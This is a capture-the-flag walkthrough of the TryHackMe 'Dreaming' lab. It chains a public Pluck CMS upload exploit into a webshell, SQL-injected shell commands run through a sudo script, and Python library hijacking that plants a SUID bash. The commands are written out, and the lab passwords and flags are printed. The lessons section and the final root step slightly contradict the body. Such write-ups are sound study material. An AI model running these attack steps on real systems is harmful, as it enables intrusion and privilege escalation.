---
title: "TryHackMe - Dreaming"
date: 2025-12-15 10:00:00 +0000
categories: [TryHackMe, Easy]
tags: [pluck-cms, cve-2020-29607, command-injection, python-hijacking, privesc, mysql]
---

## Summary

Dreaming is an Easy-rated TryHackMe room themed around Neil Gaiman's "The Sandman" series. The attack chain involves:
- Exploiting Pluck CMS 4.7.13 with authenticated RCE (CVE-2020-29607)
- Credential discovery in configuration files
- Command injection via MySQL database manipulation
- Python library hijacking through writable system modules

## Target Information

| Property | Value |
|----------|-------|
| Platform | TryHackMe |
| Difficulty | Easy |
| Objective | Capture all flags |

---

## Phase 1: Reconnaissance

Starting with a comprehensive port scan to identify exposed services and their versions.

```bash
nmap -sV -sC -Pn --top-ports 2000 10.82.132.190
```

**Results:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu | Modern version |
| 80 | HTTP | Apache 2.4.41 | Default page showing |

The Apache default page indicates a web application is likely installed in a subdirectory.

---

## Phase 2: Web Enumeration

### Directory Brute Force

```bash
gobuster dir -u http://10.82.132.190/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Key finding:** `/app` directory discovered!

### CMS Identification

Browsing to `/app/` revealed directory listing enabled with a folder named `pluck-4.7.13/`.

| Property | Value |
|----------|-------|
| CMS | Pluck |
| Version | **4.7.13** |
| Location | `/app/pluck-4.7.13/` |

---

## Phase 3: Vulnerability Research

```bash
searchsploit pluck 4.7
```

**Exact match found:**
- **CVE-2020-29607** - Pluck CMS 4.7.13 File Upload Remote Code Execution
- Requires authentication

Testing common passwords on the Pluck login page (`/login.php`), the password `password` grants access.

---

## Phase 4: Initial Foothold

### Exploiting CVE-2020-29607

```bash
wget https://www.exploit-db.com/raw/49909 -O pluck_rce.py
python3 pluck_rce.py 10.82.132.190 80 password /app/pluck-4.7.13
```

**Result:** Webshell uploaded to `/app/pluck-4.7.13/files/shell.phar`

Initial shell as `www-data`. Three interesting users discovered:
- **lucien** - Librarian of the Dreaming
- **death** - Morpheus's sister
- **morpheus** - Lord of Dreams

### Credential Discovery

Found in `/opt/test.py`:

```python
password = "HeyLucien#@1999!"
```

---

## Phase 5: Privilege Escalation

### Stage 1: www-data → lucien

```bash
ssh lucien@10.82.132.190
# Password: HeyLucien#@1999!
```

**Flag:** `lucien_flag.txt` captured!

### Stage 2: lucien → death

Checking sudo permissions:

```bash
sudo -l
# (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

The script has a command injection vulnerability via MySQL database values:

```python
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
```

MySQL credentials found in bash history: `lucien42DBPASSWORD`

**Exploitation:**

```bash
mysql -u lucien -p'lucien42DBPASSWORD' library \
  -e "UPDATE dreams SET dream = '; cat /home/death/death_flag.txt #' WHERE dreamer = 'Alice';"
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

**Death's Flag:** `THM{1M_TH3R3_4_TH3M}`

Death's password extracted from getDreams.py: `!mementoMORI666!`

### Stage 3: death → morpheus

Using LinPEAS, discovered that the **death group** has write access to `/usr/lib/python3.8/shutil.py`.

A cron job runs `/home/morpheus/restore.py` as morpheus, which imports shutil:

```python
from shutil import copy2 as backup
```

**Python Library Hijacking:**

Modified `/usr/lib/python3.8/shutil.py` to include:

```python
import os
os.system("cp /home/morpheus/morpheus_flag.txt /tmp/morph_flag && chmod 777 /tmp/morph_flag")
os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
```

After the cron job executed:

**Morpheus's Flag:** `THM{DR34MS_5H4P3_TH3_W0RLD}`

### Stage 4: morpheus → root

SUID bash available at `/tmp/rootbash`:

```bash
/tmp/rootbash -p
```

---

## Attack Chain Summary

```
www-data (Pluck RCE)
    │
    ▼ /opt/test.py credentials
lucien
    │
    ▼ Command injection via MySQL + sudo
death
    │
    ▼ Python library hijacking (shutil.py)
morpheus
    │
    ▼ SUID bash
root
```

---

## Key Lessons

1. **Version disclosure is dangerous** - Pluck version in folder name led directly to CVE
2. **Password reuse** - Lucien's password worked for SSH from a web config file
3. **Check bash history** - MySQL password was left in `.bash_history`
4. **Writable system files = game over** - death group write access to shutil.py enabled privilege escalation
5. **Cron jobs execute code you control** - Library hijacking through writable imports

---

## Tools Used

- nmap - Port scanning
- gobuster - Directory enumeration
- searchsploit - Exploit research
- MySQL - Database manipulation
- LinPEAS - Privilege escalation enumeration
